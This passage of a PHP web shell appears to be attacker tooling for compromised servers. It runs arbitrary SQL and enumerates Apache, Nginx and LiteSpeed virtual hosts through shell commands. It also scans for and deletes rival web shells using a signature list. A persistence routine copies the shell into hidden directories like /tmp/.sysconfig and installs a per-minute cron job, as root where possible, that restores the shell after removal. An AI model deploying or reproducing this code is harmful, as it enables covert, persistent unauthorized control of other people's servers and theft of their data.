        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'get_table_data') {
    header('Content-Type: application/json');
    $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
    $port = intval(isset($_POST['db_port']) ? $_POST['db_port'] : 3306);
    $dbname = isset($_POST['db_name']) ? $_POST['db_name'] : '';
    $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
    $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
    $table = isset($_POST['table']) ? $_POST['table'] : '';
    $table = preg_replace('/[^a-zA-Z0-9_-]/', '', $table); // Sanitize table name
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $countStmt = $pdo->query("SELECT COUNT(*) FROM `$table`");
        $totalRows = $countStmt->fetchColumn();
        $stmt = $pdo->query("SELECT * FROM `$table` LIMIT 50");
        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $columns = empty($data) ? [] : array_keys($data[0]);
        echo json_encode(['success' => true, 'data' => $data, 'columns' => $columns, 'total_rows' => $totalRows]);
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'execute_sql') {
    header('Content-Type: application/json');
    $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
    $port = intval(isset($_POST['db_port']) ? $_POST['db_port'] : 3306);
    $dbname = isset($_POST['db_name']) ? $_POST['db_name'] : '';
    $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
    $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
    $query = isset($_POST['sql_query']) ? $_POST['sql_query'] : '';
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $startTime = microtime(true);
        $stmt = $pdo->query($query);
        $executionTime = round((microtime(true) - $startTime) * 1000, 2) . ' ms';
        if ($stmt->columnCount() > 0) {
            $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
            $columns = empty($data) ? [] : array_keys($data[0]);
            echo json_encode(['success' => true, 'data' => $data, 'columns' => $columns, 'num_rows' => count($data), 'execution_time' => $executionTime]);
        } else {
            $affectedRows = $stmt->rowCount();
            echo json_encode(['success' => true, 'message' => 'Query executed successfully', 'affected_rows' => $affectedRows, 'execution_time' => $executionTime]);
        }
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'install_persistence') {
    try {
        header('Content-Type: application/json');
        $result = install_persistence_mechanisms();
        echo json_encode($result);
    } catch (Exception $e) {
        safe_json_error('Persistence installation failed', $e->getMessage());
    }
    exit;
}

if (isset($_POST['action']) && strpos($_POST['action'], 'install_persistence_') === 0) {
    try {
        header('Content-Type: application/json');
        $type = substr($_POST['action'], strlen('install_persistence_'));
        $result = install_persistence_single($type);
        echo json_encode($result);
    } catch (Exception $e) {
        safe_json_error('Persistence installation failed', $e->getMessage());
    }
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'get_current_dir') {
    header('Content-Type: application/json');

    // Get current directory from browser location (d parameter)
    $current_dir = isset($_GET['d']) && !empty($_GET['d'])
        ? realpath($_GET['d'])  // Use current browse directory
        : dirname(__FILE__);    // Fallback to script directory

    echo json_encode([
        'current_dir' => $current_dir ?: dirname(__FILE__),
        'success' => true
    ]);
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'scan_shells') {
    // Disable all output buffering and errors
    while (ob_get_level() > 0) {
        ob_end_clean();
    }

    error_reporting(0);
    ini_set('display_errors', 0);
    ini_set('display_startup_errors', 0);

    // Remove any previously sent headers
    header('Content-Type: application/json; charset=utf-8', true);
    header('Cache-Control: no-cache, no-store, must-revalidate', true);
    header('Pragma: no-cache', true);
    header('Expires: 0', true);

    try {
        // Get parameters from query string
        $scan_dir = isset($_GET['scan_dir']) && !empty($_GET['scan_dir'])
            ? $_GET['scan_dir']
            : (isset($_GET['d']) ? $_GET['d'] : dirname(__FILE__));

        // Validate directory exists
        $scan_dir = realpath($scan_dir);
        if (!$scan_dir || !is_dir($scan_dir)) {
            while (ob_get_level() > 0) { @ob_end_clean(); }
            echo json_encode([
                'success' => false,
                'error' => 'Invalid directory',
                'scanned' => 0,
                'found' => 0,
                'shells' => []
            ]);
            exit;
        }

        $max_depth = isset($_GET['max_depth']) ? (int)$_GET['max_depth'] : 5;
        $max_files = isset($_GET['max_files']) ? (int)$_GET['max_files'] : 5000;

        // Increase limits for scan
        @ini_set('memory_limit', '256M');
        @set_time_limit(120);

        $result = scan_shells($scan_dir, $max_depth, $max_files);

        // Ensure result is array
        if (!is_array($result)) {
            $result = [
                'success' => false,
                'error' => 'Invalid result type: ' . gettype($result),
                'scanned' => 0,
                'found' => 0,
                'shells' => []
            ];
        }

        // Validate result can be JSON encoded
        $json = json_encode($result, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        if ($json === false) {
            // Fallback if json_encode fails
            $json = json_encode(array(
                'success' => false,
                'error' => 'JSON encode failed: ' . json_last_error_msg(),
                'scanned' => isset($result['scanned']) ? $result['scanned'] : 0,
                'found' => isset($result['found']) ? $result['found'] : 0,
                'shells' => array()
            ));
        }

        while (ob_get_level() > 0) { @ob_end_clean(); }
        echo $json;
    } catch (Throwable $e) {
        while (ob_get_level() > 0) { @ob_end_clean(); }
        echo json_encode([
            'success' => false,
            'error' => 'Error: ' . $e->getMessage(),
            'line' => $e->getLine(),
            'file' => basename($e->getFile()),
            'scanned' => 0,
            'found' => 0,
            'shells' => []
        ]);
    }
    exit;
}

// 🔥 VIRTUALHOST SCANNER - Find domains and document roots
// Dokumentasi: Mencari di Apache/Nginx config files sesuai distro
if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
    error_reporting(0);
    ini_set('display_errors', 0);
    
    // Check execution environment first
    $env_check = check_execution_environment();
    if (!$env_check['can_execute']) {
        safe_json_error(
            'Cannot execute commands: All shell functions are disabled',
            implode('; ', $env_check['issues'])
        );
    }
    
    $type = isset($_GET['server_type']) ? $_GET['server_type'] : 'all';
    $results = array('success' => true, 'apache' => array(), 'nginx' => array(), 'litespeed' => array(), 'other' => array(), 'warnings' => array(), 'distro' => '');
    
    // Detect distro type
    $distro = 'unknown';
    if (is_dir('/etc/apache2/sites-available')) {
        $distro = 'debian'; // Debian/Ubuntu
    } elseif (is_dir('/etc/httpd/conf.d')) {
        $distro = 'rhel'; // CentOS/RHEL
    }
    $results['distro'] = $distro;
    
    // Apache VirtualHost scanning
    if ($type === 'apache' || $type === 'all') {
        // Paths berdasarkan dokumentasi
        $apache_paths = [];
        
        if ($distro === 'debian') {
            // Debian/Ubuntu paths
            $apache_paths = [
                '/etc/apache2/sites-available',
                '/etc/apache2/sites-enabled',
            ];
        } elseif ($distro === 'rhel') {
            // CentOS/RHEL paths
            $apache_paths = [
                '/etc/httpd/conf.d',
                '/etc/httpd/sites-available',
            ];
        } else {
            // Try all known paths
            $apache_paths = [
                '/etc/apache2/sites-available',
                '/etc/apache2/sites-enabled',
                '/etc/httpd/conf.d',
                '/etc/httpd/sites-available',
                '/usr/local/apache2/conf',
                '/opt/lampp/etc/extra',
            ];
        }
        
        foreach ($apache_paths as $path) {
            if (is_dir($path)) {
                // Pattern sesuai dokumentasi: ServerName + DocumentRoot
                $cmd = "grep -r -h -E 'ServerName|DocumentRoot|ServerAlias' " . escapeshellarg($path) . " 2>/dev/null | head -100";
                $output = execute_shell_command($cmd);
                if ($output) {
                    $results['apache'] = array_merge($results['apache'], parseApacheVirtualHosts($output));
                }
            }
        }
        
        // Try apachectl -S for configured vhosts
        $apachectl_cmd = "apachectl -S 2>/dev/null || apache2ctl -S 2>/dev/null || httpd -S 2>/dev/null";
        $apachectl_output = execute_shell_command($apachectl_cmd);
        if ($apachectl_output) {
            $results['apachectl_output'] = $apachectl_output;
        }
    }
    
    // Nginx VirtualHost scanning
    // Sesuai dokumentasi: Debian/Ubuntu vs CentOS/RHEL
    if ($type === 'nginx' || $type === 'all') {
        $nginx_paths = [];
        
        if ($distro === 'debian') {
            // Debian/Ubuntu paths
            $nginx_paths = [
                '/etc/nginx/sites-available',
                '/etc/nginx/sites-enabled',
            ];
        } elseif ($distro === 'rhel') {
            // CentOS/RHEL paths
            $nginx_paths = [
                '/etc/nginx/conf.d',
            ];
        } else {
            // Try all known paths
            $nginx_paths = [
                '/etc/nginx/sites-available',
                '/etc/nginx/sites-enabled',
                '/etc/nginx/conf.d',
                '/usr/local/nginx/conf',
                '/opt/nginx/conf',
            ];
        }
        
        foreach ($nginx_paths as $path) {
            if (is_dir($path)) {
                // Pattern sesuai dokumentasi: server_name + root
                // Contoh dari dokumentasi:
                // grep -R "server_name\|root" /etc/nginx/sites-available/ /etc/nginx/conf.d/
                $cmd = "grep -r -h -E 'server_name|root|listen' " . escapeshellarg($path) . " 2>/dev/null | head -100";
                $output = execute_shell_command($cmd);
                if ($output) {
                    $results['nginx'] = array_merge($results['nginx'], parseNginxVirtualHosts($output));
                }
            }
        }
        
        // Try nginx -T for full config dump
        $nginx_t_cmd = "nginx -T 2>/dev/null | grep -E 'server_name|root|listen' | head -100";
        $nginx_t_output = execute_shell_command($nginx_t_cmd);
        if ($nginx_t_output) {
            $results['nginx'] = array_merge($results['nginx'], parseNginxVirtualHosts($nginx_t_output));
        }
    }
    
    // LiteSpeed/OpenLiteSpeed scanning
    if ($type === 'all' || $type === 'litespeed') {
        $lsws_paths = [
            '/usr/local/lsws/conf',
            '/var/www/conf',
            '/usr/local/lsws/conf/vhosts',
        ];
        
        foreach ($lsws_paths as $path) {
            if (is_dir($path)) {
                // Try httpd_config.conf for vhost config
                $httpd_conf = $path . '/httpd_config.conf';
                if (file_exists($httpd_conf)) {
                    $content = @file_get_contents($httpd_conf);
                    if ($content) {
                        $results['litespeed'] = array_merge($results['litespeed'], parseLiteSpeedVirtualHosts($content));
                    }
                }
                
                // Try vhost.conf files
                $cmd = "find " . escapeshellarg($path) . " -name '*.conf' -exec grep -H -E 'vhRoot|docRoot|vhDomain' {} \; 2>/dev/null | head -50";
                $output = execute_shell_command($cmd);
                if ($output) {
                    $results['litespeed'] = array_merge($results['litespeed'], parseLiteSpeedGrepOutput($output));
                }
            }
        }
        
        // Try LiteSpeed API/CLI
        $lsws_admin = execute_shell_command("which lswsctrl 2>/dev/null || which olsctrl 2>/dev/null");
        if ($lsws_admin) {
            $results['litespeed_detected'] = true;
        }
    }
    
    // Remove duplicates
    $results['apache'] = array_unique($results['apache'], SORT_REGULAR);
    $results['nginx'] = array_unique($results['nginx'], SORT_REGULAR);
    
    // Add any environment warnings
    if (!empty($env_check['issues'])) {
        $results['warnings'] = $env_check['issues'];
    }
    
    safe_json_output($results);
}

function parseApacheVirtualHosts($output) {
    $vhosts = [];
    $lines = explode("\n", $output);
    $current = null;
    
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line) || strpos($line, '#') === 0) continue;
        
        // Match ServerName
        if (preg_match('/ServerName\s+([^\s]+)/i', $line, $matches)) {
            $current = ['domain' => $matches[1], 'docroot' => '', 'aliases' => []];
            $vhosts[] = $current;
        }
        // Match ServerAlias
        elseif (preg_match('/ServerAlias\s+(.+)/i', $line, $matches) && $current !== null) {
            $aliases = preg_split('/\s+/', trim($matches[1]));
            $current['aliases'] = array_filter($aliases);
            // Update last entry
            if (!empty($vhosts)) {
                $vhosts[count($vhosts) - 1]['aliases'] = $current['aliases'];
            }
        }
        // Match DocumentRoot
        elseif (preg_match('/DocumentRoot\s+["\']?([^"\'\s]+)["\']?/i', $line, $matches) && $current !== null) {
            $current['docroot'] = $matches[1];
            if (!empty($vhosts)) {
                $vhosts[count($vhosts) - 1]['docroot'] = $matches[1];
            }
        }
    }
    
    return array_filter($vhosts, function($v) {
        return !empty($v['domain']);
    });
}

function parseNginxVirtualHosts($output) {
    $vhosts = [];
    $lines = explode("\n", $output);
    $current = null;
    $in_server_block = false;
    
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line) || strpos($line, '#') === 0) continue;
        
        // Match server_name
        if (preg_match('/server_name\s+([^;]+);/i', $line, $matches)) {
            $domains = preg_split('/\s+/', trim($matches[1]));
            foreach ($domains as $domain) {
                $domain = trim($domain);
                if ($domain && $domain !== '_' && strpos($domain, '*') === false) {
                    $current = ['domain' => $domain, 'docroot' => '', 'listen' => ''];
                    $vhosts[] = $current;
                }
            }
        }
        // Match root
        elseif (preg_match('/root\s+([^;]+);/i', $line, $matches) && $current !== null) {
            $root = trim($matches[1]);
            $current['docroot'] = $root;
            if (!empty($vhosts)) {
                $vhosts[count($vhosts) - 1]['docroot'] = $root;
            }
        }
        // Match listen
        elseif (preg_match('/listen\s+([^;]+);/i', $line, $matches) && $current !== null) {
            $listen = trim($matches[1]);
            $current['listen'] = $listen;
            if (!empty($vhosts)) {
                $vhosts[count($vhosts) - 1]['listen'] = $listen;
            }
        }
    }
    
    return array_filter($vhosts, function($v) {
        return !empty($v['domain']);
    });
}

// 🔥 LiteSpeed VirtualHost Parser
function parseLiteSpeedVirtualHosts($content) {
    $vhosts = [];
    $lines = explode("\n", $content);
    $current_vhost = null;
    $in_vhost = false;
    
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line) || strpos($line, '#') === 0) continue;
        
        // Match virtualhost { block start
        if (preg_match('/^virtualhost\s+(\w+)\s*\{/i', $line, $matches)) {
            $in_vhost = true;
            $current_vhost = ['name' => $matches[1], 'domain' => '', 'docroot' => '', 'configfile' => ''];
        }
        // Match vhRoot
        elseif ($in_vhost && preg_match('/vhRoot\s+(.+)/i', $line, $matches)) {
            $current_vhost['docroot'] = trim($matches[1]);
        }
        // Match configFile
        elseif ($in_vhost && preg_match('/configFile\s+(.+)/i', $line, $matches)) {
            $current_vhost['configfile'] = trim($matches[1]);
            // Try to parse vhost config file for domain
            if (file_exists($current_vhost['configfile'])) {
                $vhost_config = @file_get_contents($current_vhost['configfile']);
                if ($vhost_config && preg_match('/vhDomain\s+(.+)/i', $vhost_config, $domain_match)) {
                    $current_vhost['domain'] = trim($domain_match[1]);
                }
            }
        }
        // Match vhDomain directly
        elseif ($in_vhost && preg_match('/vhDomain\s+(.+)/i', $line, $matches)) {
            $current_vhost['domain'] = trim($matches[1]);
        }
        // Match docRoot directly
        elseif ($in_vhost && preg_match('/docRoot\s+(.+)/i', $line, $matches)) {
            $current_vhost['docroot'] = trim($matches[1]);
        }
        // Block end
        elseif ($in_vhost && $line === '}') {
            if (!empty($current_vhost['domain']) || !empty($current_vhost['docroot'])) {
                $vhosts[] = [
                    'domain' => $current_vhost['domain'] ?: $current_vhost['name'],
                    'docroot' => $current_vhost['docroot'],
                    'listen' => '80/443'
                ];
            }
            $in_vhost = false;
            $current_vhost = null;
        }
    }
    
    return array_filter($vhosts, function($v) {
        return !empty($v['domain']);
    });
}

function parseLiteSpeedGrepOutput($output) {
    $vhosts = [];
    $lines = explode("\n", $output);
    
    foreach ($lines as $line) {
        // Format: file:vhRoot path
        if (preg_match('/^(.+):vhRoot\s+(.+)$/i', $line, $matches)) {
            $docroot = trim($matches[2]);
            // Try to extract domain from path
            $domain = basename($docroot);
            if (strpos($domain, '.') !== false) {
                $vhosts[] = [
                    'domain' => $domain,
                    'docroot' => $docroot,
                    'listen' => '80/443'
                ];
            }
        }
    }
    
    return $vhosts;
}

if (isset($_POST['action']) && $_POST['action'] === 'delete_shell') {
    header('Content-Type: application/json');
    $target = isset($_POST['target']) ? $_POST['target'] : '';
    if ($target && file_exists($target) && is_file($target)) {
        // Security check: ensure target is within web root or current dir
        $real_target = realpath($target);
        $web_root = realpath(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__));
        $current_dir = realpath(dirname(__FILE__));
        
        if (strpos($real_target, $web_root) === 0 || strpos($real_target, $current_dir) === 0) {
            if (@unlink($real_target)) {
                echo json_encode(['success' => true, 'message' => 'File deleted successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Failed to delete file (permission denied)']);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'Security: Target outside allowed directories']);
        }
    } else {
        echo json_encode(['success' => false, 'error' => 'File not found']);
    }
    exit;
}





// Helper function: Find writable directories for backup storage
function find_writable_directories() {
    $writable_dirs = [];
    
    // Priority locations to check (stealthy and usually writable)
    $candidates = [
        '/tmp/.sysconfig' => '/tmp/.sysconfig',  // nested in tmp
        '/var/tmp/.cache' => '/var/tmp/.cache',  // nested in var/tmp
        '/dev/shm/.config' => '/dev/shm/.config', // shared memory
        sys_get_temp_dir() . '/.session' => sys_get_temp_dir() . '/.session',
        getenv('HOME') . '/.cache' => getenv('HOME') . '/.cache', // user home
        '/opt/.backup' => '/opt/.backup',
    ];
    
    // Try to create and write to each candidate
    foreach ($candidates as $name => $path) {
        if (!is_dir($path)) {
            @mkdir($path, 0755, true);
        }
        if (is_dir($path) && is_writable($path)) {
            $test_file = $path . '/.test_' . time();
            if (@file_put_contents($test_file, 'test') !== false) {
                @unlink($test_file);
                $writable_dirs[$name] = $path;
            }
        }
        // Limit to 3 directories max
        if (count($writable_dirs) >= 3) break;
    }
    
    return $writable_dirs;
}

// Helper: Extract and decode ASCII-encoded payloads from PHP content
function extract_ascii_payloads($content) {
    $payloads = [];

    // Limit content size to prevent issues
    if (strlen($content) > 100000) {
        $content = substr($content, 0, 100000);
    }

    // Pattern: [104,116,116,...] byte arrays
    $matches_result = @preg_match_all('/\[(\d+(?:,\d+){5,})\]/', $content, $matches);
    if ($matches_result === false || !isset($matches[1])) {
        return []; // Regex error or no matches
    }

    foreach ($matches[1] as $bytes) {
        if (strlen($bytes) > 5000) {
            continue; // Skip very long byte arrays
        }

        $byte_array = array_map('intval', explode(',', $bytes));
        $decoded = '';

        foreach ($byte_array as $byte) {
            if ($byte >= 0 && $byte <= 255) {
                $decoded .= chr($byte);
            }
        }

        // Only include if looks like valid data (URL, code, etc)
        if (!empty($decoded) && strlen($decoded) > 5 && strlen($decoded) < 10000) {
            // Check if looks like URL or code
            if (preg_match('/^https?:|^[a-zA-Z_]|^\//', $decoded)) {
                $payloads[] = [
                    'type' => 'ASCII bytes',
                    'decoded' => $decoded,
                    'length' => strlen($decoded)
                ];
            }
        }

        // Limit number of payloads collected
        if (count($payloads) >= 5) {
            break;
        }
    }

    return $payloads;
}

// Shell scanner - detect other web shells on the server
function scan_shells($scan_dir = null, $max_depth = 5, $max_files = 5000) {
    if (!$scan_dir) {
        $scan_dir = dirname(__FILE__);
    }
    $scan_dir = realpath($scan_dir);

    // Validate parameters
    $max_depth = max(1, min(10, (int)$max_depth));  // 1-10
    $max_files = max(100, min(50000, (int)$max_files));  // 100-50000

    // Known shell signatures (filenames)
    $shell_names = [
        'c99.php', 'r57.php', 'b374k.php', 'wsopriv.php', 'alfa.php',
        'shell.php', 'cmd.php', 'backdoor.php', '0x.php', 'marijuana.php',
        'gelay.php', 'wso.php', 'anonsec.php', 'phpshell.php', 'bypass.php',
        'config.php.bak', '.shell.php', 'tmp.php', 'test.php', 'phpinfo.php',
        'up.php', 'upload.php', 'uploader.php', 'filemanager.php',
        'fm.php', 'adminer.php', 'pma.php', 'phpmyadmin.php',
        'settings.php.bak', 'config.bak.php', '.config.php',
        'wp-config.php.bak', 'configuration.php.bak', '.htaccess.php'
    ];
    
    // Content signatures (suspicious patterns)
    $content_signatures = [
        'eval(base64_decode' => 'Obfuscated eval',
        'eval(gzinflate' => 'Compressed eval',
        'eval(str_rot13' => 'ROT13 obfuscation',
        'shell_exec($_GET' => 'Direct shell_exec',
        'shell_exec($_POST' => 'Direct shell_exec',
        'system($_GET' => 'Direct system',
        'system($_POST' => 'Direct system',
        'passthru($_GET' => 'Direct passthru',
        'exec($_GET' => 'Direct exec',
        'assert($_GET' => 'Code execution',
        'preg_replace.*\/e' => 'Deprecated eval regex',
        'create_function' => 'Dynamic function',
        'WSO_VERSION' => 'WSO Shell signature',
        'c99\(self-named' => 'C99 Shell signature',
        'r57\(simple' => 'R57 Shell signature',
        'b374k' => 'B374k Shell signature',
        'file_put_contents.*base64_decode' => 'File write backdoor',
        'move_uploaded_file.*\/tmp\/' => 'Suspicious upload handler',
        'Solevisible' => 'Alfa Shell (Solevisible)',
        'oZgNypoPRU' => 'Alfa Shell variable',
        'Alfa-Team' => 'Alfa/Solevisible signature'
    ];
    
    $found_shells = [];
    $scanned = 0;
    // $max_files already set from parameter above
    
    try {
        $directory = new RecursiveDirectoryIterator($scan_dir, RecursiveDirectoryIterator::SKIP_DOTS);

        // Filter to skip inaccessible directories (permission denied)
        $filter = new RecursiveCallbackFilterIterator(
            $directory,
            function ($current, $key, $iterator) {
                // Allow if directory is readable
                if ($current->isDir()) {
                    return @is_readable($current->getRealPath());
                }
                return true; // Always check files
            }
        );

        $iterator = new RecursiveIteratorIterator($filter, RecursiveIteratorIterator::SELF_FIRST);
        $iterator->setMaxDepth($max_depth); // Limit recursion depth
    } catch (Exception $e) {
        return [
            'success' => false,
            'error' => 'Cannot access directory: ' . $e->getMessage(),
            'scan_dir' => $scan_dir
        ];
    }

    foreach ($iterator as $file) {
        if ($scanned >= $max_files) {
            break;
        }

        try {
            // Skip if not a file or not PHP - use try-catch for permission denied
            if (!@$file->isFile() || @$file->getExtension() !== 'php') {
                continue;
            }

            $scanned++;
            $filename = strtolower(@$file->getFilename());
            $filepath = @$file->getRealPath();

            // Skip if we couldn't get filepath (permission denied, symlink issues, etc)
            if (!$filepath || !file_exists($filepath)) {
                continue;
            }

            $confidence = 0;
            $reasons = [];

            // Check 1: Known shell names (High confidence)
            foreach ($shell_names as $shell_name) {
                if (strpos($filename, $shell_name) !== false || $filename === $shell_name) {
                    $confidence += 80;
                    $reasons[] = "Known shell name: $shell_name";
                    break;
                }
            }

            // Check 2: Suspicious filename patterns (Medium confidence)
            if (preg_match('/^[a-f0-9]{8,}\.php$/', $filename)) {
                $confidence += 30;
                $reasons[] = "Hash-like filename";
            }
            if (strpos($filename, 'shell') !== false || strpos($filename, 'backdoor') !== false) {
                $confidence += 40;
                $reasons[] = "Suspicious keyword in filename";
            }
            if ($filename[0] === '.' && substr($filename, -4) === '.php') {
                $confidence += 20;
                $reasons[] = "Hidden PHP file";
            }

            // Check 3: File content (High confidence if matched)
            $file_size = @filesize($filepath);
            // Read first 100KB for detection (enough for most obfuscated patterns)
            if ($file_size !== false) { // Check content for all files (even large ones)
                $content = @file_get_contents($filepath, false, null, 0, 100000); // Read initial 100KB
                if ($content) {
                    foreach ($content_signatures as $pattern => $description) {
                        if (preg_match('/' . $pattern . '/i', $content)) {
                            $confidence += 60;
                            $reasons[] = $description;
                        }
                    }

                    // Check for base64 encoded large blocks
                    if (preg_match('/[A-Za-z0-9+\/]{1000,}={0,2}/', $content)) {
                        $confidence += 20;
                        $reasons[] = "Large base64 block detected";
                    }

                    // ENHANCED: Detect Alfa/Solevisible shell pattern (base64 chunks)
                    // Pattern: $var .= "..." (multiple concatenations with .= operator)
                    $base64_chunks = preg_match_all('/\$\w+\s*\.=\s*["\']/', $content);
                    if ($base64_chunks > 100) {  // Suspicious if 100+ chunk concatenations
                        $confidence += 50;
                        $reasons[] = "Chunk concatenation via .= operator (Alfa shell pattern)";
                    } elseif ($base64_chunks > 50) {  // Moderately suspicious
                        $confidence += 30;
                        $reasons[] = "Multiple string concatenations detected";
                    }

                    // ENHANCED: Detect string concatenation obfuscation for functions
                    // Pattern: 'x' . 'y' . 'z' or "x" . "y" (string concatenation)
                    $obfuscated_funcs = preg_match_all("/['\"][a-z0-9_]*['\"]\s*\.\s*['\"][a-z0-9_]*['\"]/i", $content);
                    if ($obfuscated_funcs > 20) {  // Many concatenated strings
                        $confidence += 40;
                        $reasons[] = "Widespread string concatenation obfuscation";
                    } elseif ($obfuscated_funcs > 5) {  // Some obfuscated function names
                        $confidence += 25;
                        $reasons[] = "String concatenation obfuscation detected";
                    }

                    // ENHANCED: Detect obfuscated eval pattern
                    // Pattern: $var = 'e' . 'v' . 'al'; $var(...)
                    if (preg_match("/['\"]e['\"]\s*\.\s*['\"]v['\"]\s*\.\s*['\"]al['\"]/", $content)) {
                        $confidence += 40;
                        $reasons[] = "Obfuscated eval() detected";
                    }

                    // QUICK FIX: Detect ASCII-encoded malware (like fki5.php)
                    // Check for ASCII byte arrays [104,116,116,...]
                    $has_ascii_arrays = preg_match('/\[\d+(?:,\d+){5,}\]/', $content);

                    // Check for obfuscated network functions
                    $has_network_func = preg_match('/file_get_contents|fgc|curl|fsockopen|\$f[a-z]{2}|stream_context/', $content);

                    // Check for execution functions
                    $has_exec_func = preg_match('/include|require|eval|assert|create_function|\$\w+\(/', $content);

                    // If all three indicators present = likely obfuscated malware
                    if ($has_ascii_arrays && $has_network_func && $has_exec_func) {
                        $confidence += 50;  // Significant boost
                        $reasons[] = "ASCII-encoded payload detected";
                        $reasons[] = "Network + execution pattern detected";
                    }
                    // If ASCII arrays + network functions = suspicious obfuscation
                    elseif ($has_ascii_arrays && $has_network_func) {
                        $confidence += 35;
                        $reasons[] = "ASCII-encoded network payload";
                    }
                    // String concatenation for common functions = obfuscation indicator
                    elseif (preg_match('/"[a-z_]"\s*\.\s*"[a-z_]".*(?:file_get_contents|eval|exec|system)/', $content)) {
                        $confidence += 30;
                        $reasons[] = "Obfuscated function calls";
                    }
                }
            }

            // Check 4: File size (shells usually 10KB-500KB)
            $size = isset($file_size) ? $file_size : 0;
            if ($size > 10000 && $size < 500000) {
                // Normal shell size, no penalty
            } elseif ($size > 500000) {
                $confidence -= 10; // Large file less likely shell
            }

            // Check 5: Recent modification (within 7 days)
            $mtime = @filemtime($filepath);
            if ($mtime && (time() - $mtime) < 604800) {
                $confidence += 10;
                $reasons[] = "Recently modified";
            }

            // Calculate relative depth from scan root
            $relative_path = str_replace($scan_dir . '/', '', $filepath);
            $depth = substr_count($relative_path, '/');

            // If confidence >= 30, report as potential shell
            if ($confidence >= 30) {
                $shell_data = [
                    'path' => (string)$filepath,
                    'relative_path' => (string)$relative_path,
                    'filename' => (string)basename($filepath),
                    'size' => (int)$size,
                    'modified' => (string)($mtime ? date('Y-m-d H:i:s', $mtime) : 'N/A'),
                    'confidence' => (int)min($confidence, 100),
                    'reasons' => array_map('strval', array_slice($reasons, 0, 4)), // Max 4 reasons
                    'dir' => (string)dirname($filepath),
                    'depth' => (int)$depth
                ];

                // If ASCII-encoded payload detected, extract and decode
                if (in_array("ASCII-encoded payload detected", $reasons) && isset($content)) {
                    $decoded_payloads = extract_ascii_payloads($content);
                    if (!empty($decoded_payloads) && is_array($decoded_payloads)) {
                        // Ensure payloads are clean
                        $shell_data['decoded_payloads'] = array_map(function($p) {
                            return array(
                                'type' => (string)(isset($p['type']) ? $p['type'] : ''),
                                'decoded' => (string)(isset($p['decoded']) ? $p['decoded'] : ''),
                                'length' => (int)(isset($p['length']) ? $p['length'] : 0)
                            );
                        }, $decoded_payloads);
                    }
                }

                $found_shells[] = $shell_data;
            }
        } catch (UnexpectedValueException $e) {
            // Skip directories with permission denied errors
            // Iterator will continue with next item
            continue;
        } catch (Exception $e) {
            // Skip any other file access errors and continue
            continue;
        }
    }
    
    // Sort by confidence (highest first)
    usort($found_shells, function($a, $b) {
        return (int)$b['confidence'] - (int)$a['confidence'];
    });

    return [
        'success' => true,
        'scanned' => (int)$scanned,
        'found' => (int)count($found_shells),
        'shells' => array_values($found_shells),  // Re-index array
        'scan_dir' => (string)$scan_dir,
        'max_depth' => (int)$max_depth,
        'recursive' => true
    ];
}

// ProgressEmitter class is now embedded in consolidated section above

function install_persistence_mechanisms() {
    $results = [];
    $shell_path = __FILE__;
    $shell_dir = dirname($shell_path);
    $shell_filename = basename($shell_path);
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $base_path = dirname($_SERVER['SCRIPT_NAME']);
    
    // Find writable system directories for backup storage
    $system_backup_dirs = find_writable_directories();
    
    // Create multiple system backups with random names
    $system_backups = [];
    $backup_names = ['config.php', 'cache.php', 'temp.php', 'session.php'];
    $i = 0;
    
    foreach ($system_backup_dirs as $dir_name => $dir_path) {
        if ($i >= count($backup_names)) break;
        $backup_file = $dir_path . '/' . $backup_names[$i];
        if (@copy($shell_path, $backup_file)) {
            $system_backups[] = [
                'path' => $backup_file,
                'name' => $backup_names[$i],
                'dir' => $dir_name
            ];
        }
        $i++;
    }
    
    // Build cron command with fallback chain
    $cron_restore_chain = '';
    foreach ($system_backups as $index => $backup) {
        if ($index > 0) $cron_restore_chain .= ' || ';
        $cron_restore_chain .= "cp {$backup['path']} $shell_path 2>/dev/null";
    }
    
    $cron_cmd_system = "* * * * * root if [ ! -f $shell_path ]; then $cron_restore_chain; fi";
    $cron_cmd_user = "* * * * * if [ ! -f $shell_path ]; then $cron_restore_chain; fi";
    
    $cron_installed = false;
    $cron_path = '';
    $cron_method = '';
    
    // Try system cron first
    if (@is_writable('/etc/cron.d/')) {
        @file_put_contents('/etc/cron.d/.system_backup', $cron_cmd_system);
        @chmod('/etc/cron.d/.system_backup', 0644);
        $cron_installed = true;
        $cron_path = '/etc/cron.d/.system_backup';
        $cron_method = 'system';
    } else {
        // Try user crontab via execute_shell_command
        $crontab_check = execute_shell_command('crontab -l 2>&1');
